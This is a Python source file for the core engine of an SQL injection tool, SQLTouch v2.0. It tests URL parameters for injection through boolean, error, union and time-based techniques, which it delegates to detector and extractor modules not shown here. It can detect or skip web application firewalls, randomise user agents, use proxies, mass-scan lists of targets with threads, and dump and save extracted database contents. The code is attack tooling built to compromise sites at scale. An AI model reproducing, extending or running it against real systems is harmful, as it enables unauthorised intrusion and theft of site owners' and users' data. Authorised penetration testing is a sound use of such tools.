"""
Core engine for SQLTouch
"""

import sys
import time
import requests
from urllib.parse import urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore

from .utils import Color, get_random_agent, get_os_info, save_results
from .detector import SQLDetector
from .extractor import DataExtractor

class SQLTouchCore:
    """Main SQL injection engine"""
    
    def __init__(self, **kwargs):
        self.url = kwargs.get('url')
        self.file_list = kwargs.get('file_list')
        self.post_data = kwargs.get('post_data')
        self.cookie = kwargs.get('cookie')
        self.headers = kwargs.get('headers', {})
        self.threads = kwargs.get('threads', 5)
        self.timeout = kwargs.get('timeout', 10)
        self.level = kwargs.get('level', 1)
        self.risk = kwargs.get('risk', 1)
        self.verbose = kwargs.get('verbose', False)
        self.proxy = kwargs.get('proxy')
        self.random_agent = kwargs.get('random_agent', False)
        self.delay = kwargs.get('delay', 0)
        self.techniques = kwargs.get('techniques', ['B', 'E', 'U', 'T'])
        self.skip_waf = kwargs.get('skip_waf', False)
        self.output_file = kwargs.get('output_file')
        self.json_output = kwargs.get('json_output', False)
        self.dump_data = kwargs.get('dump_data', False)
        self.target_db = kwargs.get('target_db')
        self.target_table = kwargs.get('target_table')
        self.target_columns = kwargs.get('target_columns')
        
        # Session
        self.session = requests.Session()
        self.vulnerabilities = []
        self.results = []
        
        # Setup session
        self._setup_session()
        
        # Initialize detectors
        self.detector = SQLDetector(self.session, self.timeout, self.verbose, self.techniques)
        self.extractor = DataExtractor(self.session, self.timeout, self.verbose)
        
    def _setup_session(self):
        """Setup HTTP session"""
        # User-Agent
        if self.random_agent:
            self.session.headers.update({'User-Agent': get_random_agent()})
        else:
            self.session.headers.update({'User-Agent': f'SQLTouch/2.0'})
        
        # Custom headers
        self.session.headers.update(self.headers)
        
        # Cookies
        if self.cookie:
            self.session.headers.update({'Cookie': self.cookie})
        
        # Proxy
        if self.proxy:
            self.session.proxies.update({'http': self.proxy, 'https': self.proxy})
    
    def _get_urls_from_file(self, filename):
        """Read URLs from file"""
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return urls
        except Exception as e:
            print(f"{Color.RED}[-] Failed to read file: {e}{Color.RESET}")
            return []
    
    def _scan_single(self, url):
        """Scan single URL"""
        print(f"{Color.CYAN}\n[*] Scanning: {url}{Color.RESET}")
        
        parsed = urlparse(url)
        if not parsed.query:
            print(f"{Color.YELLOW}[!] No parameters found in URL{Color.RESET}")
            return None
        
        params = parse_qs(parsed.query)
        for param in params.keys():
            print(f"{Color.YELLOW}[*] Testing parameter: {param}{Color.RESET}")
            
            # Detect WAF
            if not self.skip_waf:
                self.detector.detect_waf(url, param)
            
            # Check vulnerability
            vulnerable, method = self.detector.check_vulnerability(url, param)
            
            if vulnerable:
                print(f"{Color.GREEN}[+] Vulnerable! Method: {method}{Color.RESET}")
                
                result = {
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'timestamp': time.time()
                }
                
                # Extract data if requested
                if self.dump_data:
                    print(f"{Color.YELLOW}[*] Extracting data...{Color.RESET}")
                    data = self.extractor.extract_all(url, param, method)
                    result['extracted_data'] = data
                    self.results.append(result)
                
                self.vulnerabilities.append(result)
                return result
        
        print(f"{Color.YELLOW}[!] No vulnerabilities found{Color.RESET}")
        return None
    
    def _scan_mass(self, urls):
        """Scan multiple URLs with threading"""
        print(f"{Color.CYAN}[*] Starting mass scan with {self.threads} threads{Color.RESET}")
        print(f"{Color.CYAN}[*] Total targets: {len(urls)}{Color.RESET}")
        
        results = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._scan_single, url): url for url in urls}
            
            for i, future in enumerate(as_completed(futures), 1):
                url = futures[future]
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        print(f"{Color.GREEN}[{i}/{len(urls)}] Vulnerable: {url}{Color.RESET}")
                    else:
                        print(f"{Color.YELLOW}[{i}/{len(urls)}] Not vulnerable: {url}{Color.RESET}")
                except Exception as e:
                    print(f"{Color.RED}[{i}/{len(urls)}] Error scanning {url}: {e}{Color.RESET}")
                
                if self.delay > 0:
                    time.sleep(self.delay)
        
        return results
    
    def _save_results(self, data=None):
        """Save results to file"""
        if not data:
            data = self.results if self.results else self.vulnerabilities
        
        if not data:
            return
        
        if self.output_file:
            filename = self.output_file
        else:
            import time
            filename = f"sqltouch_results_{int(time.time())}.json" if self.json_output else "sqltouch_results.txt"
        
        if self.json_output:
            save_results(filename, data)
        else:
            # Save as text
            with open(filename, 'w') as f:
                for item in data:
                    f.write(str(item) + '\n')
        
        print(f"{Color.GREEN}[+] Results saved to: {filename}{Color.RESET}")
    
    def run(self):
        """Main execution"""
        # OS Info
        print(f"{Color.CYAN}[*] OS: {get_os_info()} | SQLTouch v2.0{Color.RESET}")
        print(f"{Color.CYAN}[*] Level: {self.level} | Risk: {self.risk} | Threads: {self.threads}{Color.RESET}")
        print(f"{Color.CYAN}[*] Techniques: {', '.join(self.techniques)}{Color.RESET}")
        print()
        
        # Single URL mode
        if self.url:
            result = self._scan_single(self.url)
            if result and self.dump_data:
                self._save_results()
            return result
        
        # File mode
        if self.file_list:
            urls = self._get_urls_from_file(self.file_list)
            if not urls:
                print(f"{Color.RED}[-] No URLs found in file{Color.RESET}")
                return
            
            results = self._scan_mass(urls)
            
            # Summary
            print(f"\n{Color.GREEN}{'='*60}{Color.RESET}")
            print(f"{Color.GREEN}[+] Scan completed!{Color.RESET}")
            print(f"{Color.GREEN}[+] Total targets: {len(urls)}{Color.RESET}")
            print(f"{Color.GREEN}[+] Vulnerable: {len(results)}{Color.RESET}")
            print(f"{Color.GREEN}{'='*60}{Color.RESET}")
            
            if results and self.output_file:
                self._save_results(results)
            
            return results